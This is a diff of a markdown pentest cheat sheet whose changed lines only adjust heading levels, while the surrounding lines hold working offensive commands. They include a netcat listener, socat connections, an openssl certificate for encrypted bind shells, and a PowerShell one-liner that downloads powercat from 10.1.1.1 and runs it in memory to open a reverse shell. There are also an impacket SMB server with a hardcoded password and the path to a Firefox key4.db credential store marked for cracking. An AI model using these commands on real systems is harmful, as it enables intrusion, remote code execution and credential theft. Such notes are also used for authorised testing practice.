@@ -18,7 +18,7 @@ target
 local
 `nc -lnvp 9001`
 
-# socat
+##socat
 #### connecting
 `socat - TCP4:10.11.0.22:110`
 
@@ -43,7 +43,7 @@ target
 #### encrypted bind shells
 create self-signed certificate
 `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
-# windows
+##windows
 ## one-liners
 #### dir and file
 list all files current dir
@@ -75,7 +75,7 @@ download file
 download a file and execute from memory with powercat
 `IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`
 
-## smb
+###smb
 localhost
 `sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1
 
@@ -86,14 +86,14 @@ New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.1
 cd dials:
 ```
 
-## credentials
+###credentials
 ```
 C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
 ```
 sharpweb?
 python cracker?
 
-## file transfer
+###file transfer
 
 
 
